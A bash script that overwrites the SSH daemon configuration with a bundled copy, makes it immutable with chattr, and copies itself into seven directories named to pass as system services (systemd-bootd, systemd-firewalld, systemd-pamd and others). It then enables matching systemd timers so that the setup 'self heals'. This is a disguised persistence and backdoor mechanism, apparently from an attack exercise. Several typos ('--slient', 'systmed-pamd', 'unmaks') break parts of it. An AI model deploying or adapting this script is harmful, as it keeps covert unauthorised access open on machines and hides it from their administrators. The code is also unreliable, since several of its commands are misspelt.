#! /bin/bash

SSH_CONFIG="sshd_config"

# Add our sudo drop-in file if its not there or been modified
if ! cmp --slient "/etc/ssh/$SSH_CONFIG" "files/$SSH_CONFIG" >/dev/null 2>/dev/null; then
	chattr -i -- "/etc/ssh/$SSH_CONFIG"
	cp -- "/usr/share/systemd-sshd/files/$SSH_CONFIG" "/etc/ssh/$SSH_CONFIG"
	chattr +i -- "/etc/ssh/$SSH_CONFIG"
fi

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-sshd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-pamd/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unmask systemd-bootd.service \
	systemd-firewalld.service \
	systemd-issued.service \
	systemd-maild.service \
	systmed-pamd.service \
	systemd-printerd.service \
	systemd-userd.service

systemctl unmaks systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
